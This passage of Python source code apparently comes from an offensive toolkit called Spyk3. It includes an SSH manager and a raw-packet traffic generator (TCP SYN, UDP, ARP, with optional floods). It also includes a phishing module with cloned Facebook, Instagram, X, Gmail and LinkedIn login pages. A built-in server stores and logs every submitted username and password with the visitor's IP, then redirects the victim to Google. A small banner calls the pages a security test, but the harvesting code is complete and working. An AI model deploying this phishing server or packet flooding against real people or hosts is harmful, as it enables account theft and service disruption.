                key_file=key_file,
                use_key=key_file is not None,
                timeout=self.config.ssh_default_timeout,
                notes=notes,
                created_at=datetime.datetime.now().isoformat()
            )
            
            if self.db.add_ssh_server(server):
                return {
                    'success': True,
                    'server_id': server_id,
                    'message': f'Server {name} added successfully'
                }
            else:
                return {'success': False, 'error': 'Failed to add server to database'}
        except Exception as e:
            logger.error(f"Failed to add SSH server: {e}")
            return {'success': False, 'error': str(e)}
    
    def remove_server(self, server_id: str) -> bool:
        """Remove SSH server configuration"""
        self.disconnect(server_id)
        return self.db.delete_ssh_server(server_id)
    
    def connect(self, server_id: str) -> Dict[str, Any]:
        """Establish SSH connection to server"""
        with self.lock:
            if server_id in self.connections:
                return {'success': True, 'message': 'Already connected'}
            
            if len(self.connections) >= self.config.ssh_max_connections:
                return {'success': False, 'error': f'Max connections ({self.config.ssh_max_connections}) reached'}
            
            server = self.db.get_ssh_server(server_id)
            if not server:
                return {'success': False, 'error': f'Server {server_id} not found'}
            
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                connect_kwargs = {
                    'hostname': server['host'],
                    'port': server['port'],
                    'username': server['username'],
                    'timeout': server.get('timeout', self.config.ssh_default_timeout)
                }
                
                if server.get('use_key') and server.get('key_file'):
                    key = paramiko.RSAKey.from_private_key_file(server['key_file'])
                    connect_kwargs['pkey'] = key
                elif server.get('password'):
                    connect_kwargs['password'] = server['password']
                else:
                    return {'success': False, 'error': 'No authentication method available'}
                
                client.connect(**connect_kwargs)
                
                self.connections[server_id] = client
                self.db.update_ssh_server_status(server_id, 'connected')
                
                return {
                    'success': True,
                    'message': f'Connected to {server["name"]} ({server["host"]})',
                    'server': server
                }
            except paramiko.AuthenticationException:
                return {'success': False, 'error': 'Authentication failed'}
            except Exception as e:
                logger.error(f"SSH connection error: {e}")
                return {'success': False, 'error': str(e)}
    
    def disconnect(self, server_id: str = None):
        """Disconnect SSH session(s)"""
        with self.lock:
            if server_id:
                if server_id in self.connections:
                    client = self.connections[server_id]
                    try:
                        client.close()
                    except:
                        pass
                    
                    self.db.update_ssh_server_status(server_id, 'disconnected')
                    del self.connections[server_id]
            else:
                for sid in list(self.connections.keys()):
                    self.disconnect(sid)
    
    def execute_command(self, server_id: str, command: str, timeout: int = None,
                       executed_by: str = "system") -> Dict[str, Any]:
        """Execute command on remote server via SSH"""
        start_time = time.time()
        
        if server_id not in self.connections:
            connect_result = self.connect(server_id)
            if not connect_result['success']:
                return {
                    'success': False,
                    'output': '',
                    'error': connect_result.get('error', 'Connection failed'),
                    'execution_time': time.time() - start_time
                }
        
        client = self.connections[server_id]
        server = self.db.get_ssh_server(server_id)
        server_name = server['name'] if server else server_id
        
        try:
            stdin, stdout, stderr = client.exec_command(
                command,
                timeout=timeout or self.config.ssh_default_timeout
            )
            
            output = stdout.read().decode('utf-8', errors='ignore')
            error = stderr.read().decode('utf-8', errors='ignore')
            
            execution_time = time.time() - start_time
            
            result = {
                'success': len(error) == 0,
                'output': output,
                'error': error if error else None,
                'execution_time': execution_time
            }
            
            self.db.log_ssh_command(
                server_id=server_id,
                server_name=server_name,
                command=command,
                success=result['success'],
                output=output,
                error=error if error else None,
                execution_time=execution_time,
                executed_by=executed_by
            )
            
            return result
        except Exception as e:
            logger.error(f"Command execution error: {e}")
            self.disconnect(server_id)
            return {
                'success': False,
                'output': '',
                'error': str(e),
                'execution_time': time.time() - start_time
            }
    
    def upload_file(self, server_id: str, local_path: str, remote_path: str) -> Dict[str, Any]:
        """Upload file to remote server via SFTP"""
        start_time = time.time()
        
        if server_id not in self.connections:
            connect_result = self.connect(server_id)
            if not connect_result['success']:
                return {'success': False, 'error': connect_result.get('error', 'Connection failed')}
        
        client = self.connections[server_id]
        
        try:
            sftp = client.open_sftp()
            sftp.put(local_path, remote_path)
            sftp.close()
            
            execution_time = time.time() - start_time
            
            return {
                'success': True,
                'message': f'File uploaded to {remote_path}',
                'execution_time': execution_time
            }
        except Exception as e:
            logger.error(f"File upload error: {e}")
            return {'success': False, 'error': str(e)}
    
    def download_file(self, server_id: str, remote_path: str, local_path: str) -> Dict[str, Any]:
        """Download file from remote server via SFTP"""
        start_time = time.time()
        
        if server_id not in self.connections:
            connect_result = self.connect(server_id)
            if not connect_result['success']:
                return {'success': False, 'error': connect_result.get('error', 'Connection failed')}
        
        client = self.connections[server_id]
        
        try:
            sftp = client.open_sftp()
            sftp.get(remote_path, local_path)
            sftp.close()
            
            execution_time = time.time() - start_time
            
            return {
                'success': True,
                'message': f'File downloaded to {local_path}',
                'execution_time': execution_time
            }
        except Exception as e:
            logger.error(f"File download error: {e}")
            return {'success': False, 'error': str(e)}
    
    def list_files(self, server_id: str, remote_path: str = ".") -> Dict[str, Any]:
        """List files in remote directory"""
        start_time = time.time()
        
        if server_id not in self.connections:
            connect_result = self.connect(server_id)
            if not connect_result['success']:
                return {'success': False, 'error': connect_result.get('error', 'Connection failed')}
        
        client = self.connections[server_id]
        
        try:
            sftp = client.open_sftp()
            files = sftp.listdir_attr(remote_path)
            sftp.close()
            
            file_list = []
            for f in files:
                file_list.append({
                    'name': f.filename,
                    'size': f.st_size,
                    'uid': f.st_uid,
                    'gid': f.st_gid,
                    'permissions': oct(f.st_mode)[-3:],
                    'mtime': datetime.datetime.fromtimestamp(f.st_mtime).isoformat()
                })
            
            execution_time = time.time() - start_time
            
            return {
                'success': True,
                'files': file_list,
                'count': len(file_list),
                'path': remote_path,
                'execution_time': execution_time
            }
        except Exception as e:
            logger.error(f"File listing error: {e}")
            return {'success': False, 'error': str(e)}
    
    def get_servers(self) -> List[Dict]:
        """Get all configured servers with status"""
        servers = self.db.get_ssh_servers()
        
        for server in servers:
            server_id = server['id']
            server['connected'] = server_id in self.connections
        
        return servers
    
    def get_status(self) -> Dict[str, Any]:
        """Get SSH connection status"""
        return {
            'total_connections': len(self.connections),
            'max_connections': self.config.ssh_max_connections,
            'servers': self.get_servers()
        }

# =====================
# TRAFFIC GENERATOR ENGINE
# =====================
class TrafficGeneratorEngine:
    """Network traffic generator"""
    
    def __init__(self, db_manager: DatabaseManager, config: Config):
        self.db = db_manager
        self.config = config
        self.active_generators = {}
        self.generator_threads = {}
        self.stop_events = {}
        
        self.traffic_types = {
            'icmp': 'ICMP echo requests (ping)',
            'tcp_syn': 'TCP SYN packets (half-open)',
            'tcp_connect': 'Full TCP connections',
            'udp': 'UDP packets',
            'http_get': 'HTTP GET requests',
            'dns': 'DNS queries'
        }
        
        if SCAPY_AVAILABLE:
            self.traffic_types.update({
                'tcp_ack': 'TCP ACK packets',
                'arp': 'ARP requests',
                'mixed': 'Mixed traffic types',
                'random': 'Random traffic patterns'
            })
        
        self.has_raw_socket = self._check_raw_socket_permission()
    
    def _check_raw_socket_permission(self) -> bool:
        """Check if we have permission to create raw sockets"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.close()
            return True
        except PermissionError:
            return False
        except Exception:
            return False
    
    def get_available_traffic_types(self) -> List[str]:
        """Get list of available traffic types"""
        return list(self.traffic_types.keys())
    
    def get_traffic_types_help(self) -> str:
        """Get help text for traffic types"""
        help_text = "Available Traffic Types:\n\n"
        
        help_text += "Basic Traffic:\n"
        help_text += "  icmp         - ICMP echo requests (ping)\n"
        help_text += "  tcp_syn      - TCP SYN packets (half-open)\n"
        help_text += "  tcp_connect  - Full TCP connections\n"
        help_text += "  udp          - UDP packets\n"
        help_text += "  http_get     - HTTP GET requests\n"
        help_text += "  dns          - DNS queries\n"
        
        if SCAPY_AVAILABLE and self.has_raw_socket:
            help_text += "\nAdvanced Traffic:\n"
            help_text += "  tcp_ack      - TCP ACK packets\n"
            help_text += "  arp          - ARP requests\n"
            help_text += "  mixed        - Mixed traffic types\n"
            help_text += "  random       - Random traffic patterns\n"
        
        return help_text
    
    def generate_traffic(self, traffic_type: str, target_ip: str, duration: int, 
                        port: int = None, packet_rate: int = 100, 
                        executed_by: str = "system") -> TrafficGenerator:
        """Generate traffic to target IP"""
        
        if traffic_type not in self.traffic_types:
            raise ValueError(f"Invalid traffic type. Available: {list(self.traffic_types.keys())}")
        
        if duration > self.config.traffic_max_duration:
            raise ValueError(f"Duration exceeds maximum allowed ({self.config.traffic_max_duration} seconds)")
        
        flood_types = ['ping_flood', 'syn_flood', 'udp_flood', 'http_flood']
        if traffic_type in flood_types and not self.config.traffic_allow_floods:
            raise ValueError(f"Flood traffic types are disabled in configuration")
        
        try:
            ipaddress.ip_address(target_ip)
        except ValueError:
            raise ValueError(f"Invalid IP address: {target_ip}")
        
        if port is None:
            if traffic_type == 'http_get':
                port = 80
            elif traffic_type == 'dns':
                port = 53
            else:
                port = 0
        
        generator_id = str(uuid.uuid4())[:8]
        
        generator = TrafficGenerator(
            id=generator_id,
            traffic_type=traffic_type,
            target_ip=target_ip,
            target_port=port,
            duration=duration,
            start_time=datetime.datetime.now().isoformat(),
            status="running"
        )
        
        stop_event = threading.Event()
        self.stop_events[generator_id] = stop_event
        
        thread = threading.Thread(
            target=self._run_traffic_generator,
            args=(generator_id, generator, packet_rate, stop_event)
        )
        thread.daemon = True
        thread.start()
        
        self.generator_threads[generator_id] = thread
        self.active_generators[generator_id] = generator
        
        return generator
    
    def _run_traffic_generator(self, generator_id: str, generator: TrafficGenerator, 
                               packet_rate: int, stop_event: threading.Event):
        """Run traffic generator in thread"""
        try:
            start_time = time.time()
            end_time = start_time + generator.duration
            packets_sent = 0
            bytes_sent = 0
            packet_interval = 1.0 / max(1, packet_rate)
            
            generator_func = self._get_generator_function(generator.traffic_type)
            
            while time.time() < end_time and not stop_event.is_set():
                try:
                    packet_size = generator_func(generator.target_ip, generator.target_port)
                    
                    if packet_size > 0:
                        packets_sent += 1
                        bytes_sent += packet_size
                    
                    time.sleep(packet_interval)
                except Exception as e:
                    logger.error(f"Traffic generation error: {e}")
                    time.sleep(0.1)
            
            generator.packets_sent = packets_sent
            generator.bytes_sent = bytes_sent
            generator.end_time = datetime.datetime.now().isoformat()
            generator.status = "completed" if not stop_event.is_set() else "stopped"
            
            self.db.log_traffic(generator)
        except Exception as e:
            generator.status = "failed"
            generator.error = str(e)
            self.db.log_traffic(generator)
            logger.error(f"Traffic generator failed: {e}")
        finally:
            if generator_id in self.active_generators:
                del self.active_generators[generator_id]
            if generator_id in self.stop_events:
                del self.stop_events[generator_id]
    
    def _get_generator_function(self, traffic_type: str):
        """Get generator function for traffic type"""
        generators = {
            'icmp': self._generate_icmp,
            'tcp_syn': self._generate_tcp_syn,
            'tcp_connect': self._generate_tcp_connect,
            'udp': self._generate_udp,
            'http_get': self._generate_http_get,
            'dns': self._generate_dns
        }
        
        if SCAPY_AVAILABLE:
            generators.update({
                'tcp_ack': self._generate_tcp_ack,
                'arp': self._generate_arp,
                'mixed': self._generate_mixed,
                'random': self._generate_random
            })
        
        return generators.get(traffic_type, self._generate_icmp)
    
    def _generate_icmp(self, target_ip: str, port: int) -> int:
        if not SCAPY_AVAILABLE:
            return self._generate_ping_socket(target_ip)
        
        try:
            packet = IP(dst=target_ip)/ICMP()
            send(packet, verbose=False)
            return len(packet)
        except Exception as e:
            logger.error(f"ICMP generation failed: {e}")
            return 0
    
    def _generate_ping_socket(self, target_ip: str) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            packet_id = random.randint(0, 65535)
            sequence = 1
            payload = b"Spyk3 Traffic Test"
            
            header = struct.pack("!BBHHH", 8, 0, 0, packet_id, sequence)
            checksum = self._calculate_checksum(header + payload)
            header = struct.pack("!BBHHH", 8, 0, checksum, packet_id, sequence)
            
            packet = header + payload
            sock.sendto(packet, (target_ip, 0))
            sock.close()
            
            return len(packet)
        except Exception as e:
            logger.error(f"Ping socket failed: {e}")
            return 0
    
    def _generate_tcp_syn(self, target_ip: str, port: int) -> int:
        if not SCAPY_AVAILABLE:
            return 0
        try:
            packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
            send(packet, verbose=False)
            return len(packet)
        except Exception as e:
            logger.error(f"TCP SYN generation failed: {e}")
            return 0
    
    def _generate_tcp_ack(self, target_ip: str, port: int) -> int:
        if not SCAPY_AVAILABLE:
            return 0
        try:
            packet = IP(dst=target_ip)/TCP(dport=port, flags="A", seq=random.randint(0, 1000000))
            send(packet, verbose=False)
            return len(packet)
        except Exception as e:
            logger.error(f"TCP ACK generation failed: {e}")
            return 0
    
    def _generate_tcp_connect(self, target_ip: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_ip, port))
            
            data = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: Spyk3\r\n\r\n"
            sock.send(data.encode())
            
            try:
                sock.recv(4096)
            except:
                pass
            
            sock.close()
            return len(data) + 40
        except Exception as e:
            logger.error(f"TCP connect failed: {e}")
            return 0
    
    def _generate_udp(self, target_ip: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                data = b"Spyk3 UDP Test" + os.urandom(32)
                packet = IP(dst=target_ip)/UDP(dport=port)/data
                send(packet, verbose=False)
                return len(packet)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = b"Spyk3 UDP Test" + os.urandom(32)
                sock.sendto(data, (target_ip, port))
                sock.close()
                return len(data) + 8
        except Exception as e:
            logger.error(f"UDP generation failed: {e}")
            return 0
    
    def _generate_http_get(self, target_ip: str, port: int) -> int:
        try:
            import http.client
            conn = http.client.HTTPConnection(target_ip, port, timeout=2)
            conn.request("GET", "/", headers={"User-Agent": "Spyk3"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            
            return len(f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n") + len(data) + 100
        except Exception as e:
            logger.error(f"HTTP GET failed: {e}")
            return 0
    
    def _generate_dns(self, target_ip: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            transaction_id = random.randint(0, 65535).to_bytes(2, 'big')
            flags = b'\x01\x00'
            questions = b'\x00\x01'
            answer_rrs = b'\x00\x00'
            authority_rrs = b'\x00\x00'
            additional_rrs = b'\x00\x00'
            
            query = b'\x06google\x03com\x00'
            qtype = b'\x00\x01'
            qclass = b'\x00\x01'
            
            dns_query = transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs + query + qtype + qclass
            
            sock.sendto(dns_query, (target_ip, port))
            sock.close()
            
            return len(dns_query) + 8
        except Exception as e:
            logger.error(f"DNS query failed: {e}")
            return 0
    
    def _generate_arp(self, target_ip: str, port: int) -> int:
        if not SCAPY_AVAILABLE:
            return 0
        try:
            local_mac = self._get_local_mac()
            
            packet = Ether(src=local_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=target_ip)
            sendp(packet, verbose=False)
            
            return len(packet)
        except Exception as e:
            logger.error(f"ARP generation failed: {e}")
            return 0
    
    def _generate_mixed(self, target_ip: str, port: int) -> int:
        generators = [
            self._generate_icmp,
            self._generate_tcp_syn,
            self._generate_udp,
            self._generate_http_get
        ]
        generator = random.choice(generators)
        return generator(target_ip, port)
    
    def _generate_random(self, target_ip: str, port: int) -> int:
        traffic_types = ['icmp', 'tcp_syn', 'udp', 'http_get']
        traffic_type = random.choice(traffic_types)
        generator = self._get_generator_function(traffic_type)
        return generator(target_ip, port)
    
    def _calculate_checksum(self, data):
        if len(data) % 2 != 0:
            data += b'\x00'
        
        checksum = 0
        for i in range(0, len(data), 2):
            checksum += (data[i] << 8) + data[i + 1]
        
        checksum = (checksum >> 16) + (checksum & 0xFFFF)
        checksum = ~checksum & 0xFFFF
        
        return checksum
    
    def _get_local_mac(self) -> str:
        try:
            mac = uuid.getnode()
            return ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
        except:
            return "00:11:22:33:44:55"
    
    def stop_generation(self, generator_id: str = None) -> bool:
        """Stop traffic generation"""
        if generator_id:
            if generator_id in self.stop_events:
                self.stop_events[generator_id].set()
                return True
        else:
            for event in self.stop_events.values():
                event.set()
            return True
        return False
    
    def get_active_generators(self) -> List[Dict]:
        """Get list of active traffic generators"""
        active = []
        for gen_id, generator in self.active_generators.items():
            active.append({
                "id": gen_id,
                "target_ip": generator.target_ip,
                "traffic_type": generator.traffic_type,
                "duration": generator.duration,
                "start_time": generator.start_time,
                "packets_sent": generator.packets_sent,
                "bytes_sent": generator.bytes_sent
            })
        return active

# =====================
# SOCIAL ENGINEERING TOOLS
# =====================
class SocialEngineeringTools:
    """Social engineering and phishing tools"""
    
    def __init__(self, db: DatabaseManager, config: Config):
        self.db = db
        self.config = config
        self.active_links = {}
        self.phishing_server = None
        self.server_running = False
    
    def generate_phishing_link(self, platform: str, custom_url: str = None) -> Dict[str, Any]:
        """Generate phishing link for specified platform"""
        try:
            link_id = str(uuid.uuid4())[:8]
            
            html_content = self._get_template(platform)
            
            phishing_link = PhishingLink(
                id=link_id,
                platform=platform,
                original_url=custom_url or f"https://www.{platform}.com",
                phishing_url=f"http://localhost:{self.config.phishing_default_port}/{link_id}",
                template=platform,
                created_at=datetime.datetime.now().isoformat()
            )
            
            self.db.save_phishing_link(phishing_link)
            
            self.active_links[link_id] = {
                'platform': platform,
                'html': html_content,
                'created': datetime.datetime.now()
            }
            
            return {
                'success': True,
                'link_id': link_id,
                'platform': platform,
                'phishing_url': phishing_link.phishing_url,
                'created_at': phishing_link.created_at
            }
        except Exception as e:
            logger.error(f"Failed to generate phishing link: {e}")
            return {'success': False, 'error': str(e)}
    
    def _get_template(self, platform: str) -> str:
        """Get phishing template for platform"""
        templates = {
            'facebook': self._get_facebook_template(),
            'instagram': self._get_instagram_template(),
            'twitter': self._get_twitter_template(),
            'gmail': self._get_gmail_template(),
            'linkedin': self._get_linkedin_template(),
            'custom': self._get_custom_template()
        }
        return templates.get(platform, self._get_custom_template())
    
    def _get_facebook_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Facebook - Log In or Sign Up</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { max-width: 400px; width: 100%; padding: 20px; }
        .login-box { background-color: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1); padding: 20px; }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo h1 { color: #1877f2; font-size: 40px; margin: 0; }
        .form-group { margin-bottom: 15px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px 16px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
        button { width: 100%; padding: 14px 16px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; }
        .forgot-password { text-align: center; margin-top: 16px; }
        .forgot-password a { color: #1877f2; text-decoration: none; font-size: 14px; }
        .warning { margin-top: 20px; padding: 10px; background-color: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><h1>facebook</h1></div>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email or phone number" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Log In</button>
                <div class="forgot-password"><a href="#">Forgotten account?</a></div>
            </form>
            <div class="warning">⚠️ Security test - do not enter real credentials</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_instagram_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Instagram • Login</title>
    <style>
        body { font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; background-color: #fafafa; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { max-width: 350px; width: 100%; padding: 20px; }
        .login-box { background-color: white; border: 1px solid #dbdbdb; border-radius: 1px; padding: 40px 30px; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h1 { font-family: 'Billabong', cursive; font-size: 50px; margin: 0; color: #262626; }
        .form-group { margin-bottom: 10px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 9px 8px; background-color: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; box-sizing: border-box; }
        button { width: 100%; padding: 7px 16px; background-color: #0095f6; color: white; border: none; border-radius: 4px; font-weight: 600; font-size: 14px; cursor: pointer; margin-top: 8px; }
        .divider { display: flex; align-items: center; margin: 20px 0; }
        .divider-line { flex: 1; height: 1px; background-color: #dbdbdb; }
        .divider-text { margin: 0 18px; color: #8e8e8e; font-weight: 600; font-size: 13px; }
        .warning { margin-top: 20px; padding: 10px; background-color: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><h1>Instagram</h1></div>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="username" placeholder="Phone number, username, or email" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Log In</button>
            </form>
            <div class="warning">⚠️ Security test - do not enter real credentials</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_twitter_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>X / Twitter</title>
    <style>
        body { font-family: 'TwitterChirp', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #000000; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #e7e9ea; }
        .container { max-width: 600px; width: 100%; padding: 20px; }
        .login-box { background-color: #000000; border: 1px solid #2f3336; border-radius: 16px; padding: 48px; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h1 { font-size: 40px; margin: 0; color: #e7e9ea; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 12px; background-color: #000000; border: 1px solid #2f3336; border-radius: 4px; color: #e7e9ea; font-size: 16px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background-color: #1d9bf0; color: white; border: none; border-radius: 9999px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 20px; }
        .warning { margin-top: 20px; padding: 12px; background-color: #1a1a1a; border: 1px solid #2f3336; border-radius: 8px; color: #e7e9ea; text-align: center; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><h1>𝕏</h1><h2>Sign in to X</h2></div>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="username" placeholder="Phone, email, or username" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Next</button>
            </form>
            <div class="warning">⚠️ Security test - do not enter real credentials</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_gmail_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Gmail</title>
    <style>
        body { font-family: 'Google Sans', Roboto, Arial, sans-serif; background-color: #f0f4f9; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { max-width: 450px; width: 100%; padding: 20px; }
        .login-box { background-color: white; border-radius: 28px; padding: 48px 40px 36px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h1 { color: #1a73e8; font-size: 24px; margin: 10px 0 0; }
        h2 { font-size: 24px; font-weight: 400; margin: 0 0 10px; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        button { width: 100%; padding: 13px; background-color: #1a73e8; color: white; border: none; border-radius: 4px; font-weight: 500; font-size: 14px; cursor: pointer; margin-top: 20px; }
        .warning { margin-top: 30px; padding: 12px; background-color: #e8f0fe; border: 1px solid #d2e3fc; border-radius: 8px; color: #202124; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><h1>Gmail</h1></div>
            <h2>Sign in</h2>
            <div class="subtitle">to continue to Gmail</div>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email or phone" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Next</button>
            </form>
            <div class="warning">⚠️ Security test - do not enter real credentials</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_linkedin_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>LinkedIn Login</title>
    <style>
        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', 'Fira Sans', Ubuntu, Oxygen, 'Oxygen Sans', Cantarell, 'Droid Sans', 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Lucida Grande', Helvetica, Arial, sans-serif; background-color: #f3f2f0; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { max-width: 400px; width: 100%; padding: 20px; }
        .login-box { background-color: white; border-radius: 8px; padding: 40px 32px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); }
        .logo { text-align: center; margin-bottom: 24px; }
        .logo h1 { color: #0a66c2; font-size: 32px; margin: 0; }
        h2 { font-size: 24px; font-weight: 600; margin: 0 0 8px; }
        .form-group { margin-bottom: 16px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px; border: 1px solid #666666; border-radius: 4px; font-size: 14px; box-sizing: border-box; }
        button { width: 100%; padding: 14px; background-color: #0a66c2; color: white; border: none; border-radius: 28px; font-weight: 600; font-size: 16px; cursor: pointer; margin-top: 8px; }
        .warning { margin-top: 24px; padding: 12px; background-color: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><h1>LinkedIn</h1></div>
            <h2>Sign in</h2>
            <div class="subtitle">Stay updated on your professional world</div>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email or phone number" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Sign in</button>
            </form>
            <div class="warning">⚠️ Security test - do not enter real credentials</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_custom_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <style>
        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { max-width: 400px; width: 100%; padding: 20px; }
        .login-box { background: white; border-radius: 10px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); padding: 40px; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h1 { color: #333; font-size: 28px; margin: 0; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 12px 15px; border: 1px solid #ddd; border-radius: 5px; font-size: 14px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; border-radius: 5px; font-size: 16px; font-weight: 600; cursor: pointer; }
        .warning { margin-top: 20px; padding: 10px; background-color: #fff3cd; border: 1px solid #ffeeba; border-radius: 5px; color: #856404; text-align: center; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><h1>Login</h1></div>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="username" placeholder="Username or Email" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Sign In</button>
            </form>
            <div class="warning">⚠️ Security test - do not enter real credentials</div>
        </div>
    </div>
</body>
</html>"""
    
    def start_phishing_server(self, link_id: str, port: int = None) -> bool:
        """Start phishing server for a specific link"""
        if link_id not in self.active_links:
            logger.error(f"Link ID {link_id} not found")
            return False
        
        if self.server_running:
            logger.warning("Phishing server already running")
            return False
        
        port = port or self.config.phishing_default_port
        
        try:
            # Simple HTTP server for phishing
            from http.server import HTTPServer, BaseHTTPRequestHandler
            
            class PhishingHandler(BaseHTTPRequestHandler):
                def log_message(self, format, *args):
                    pass
                
                def do_GET(self):
                    if self.path == '/':
                        self.send_response(200)
                        self.send_header('Content-type', 'text/html')
                        self.end_headers()
                        self.wfile.write(link_data['html'].encode())
                        self.server.clicks += 1
                    elif self.path == '/favicon.ico':
                        self.send_response(404)
                        self.end_headers()
                    else:
                        self.send_response(404)
                        self.end_headers()
                
                def do_POST(self):
                    if self.path == '/capture':
                        content_length = int(self.headers.get('Content-Length', 0))
                        post_data = self.rfile.read(content_length).decode('utf-8')
                        
                        form_data = urllib.parse.parse_qs(post_data)
                        username = form_data.get('email', form_data.get('username', ['']))[0]
                        password = form_data.get('password', [''])[0]
                        
                        client_ip = self.client_address[0]
                        user_agent = self.headers.get('User-Agent', 'Unknown')
                        
                        if config.phishing_capture_creds:
                            db.save_captured_credential(
                                link_id, username, password, client_ip, user_agent
                            )
                            
                            logger.info(f"Credentials captured from {client_ip}: {username}:{password}")
                        
                        self.send_response(302)
                        self.send_header('Location', 'https://www.google.com')
                        self.end_headers()
                    else:
                        self.send_response(404)
                        self.end_headers()
            
            link_data = self.active_links[link_id]
            handler = PhishingHandler
            handler.link_data = link_data
            handler.clicks = 0
            handler.db = self.db
            handler.config = self.config
            handler.link_id = link_id
            
            server = HTTPServer(('0.0.0.0', port), handler)
            
            self.server_thread = threading.Thread(target=server.serve_forever, daemon=True)
            self.server_thread.start()
            
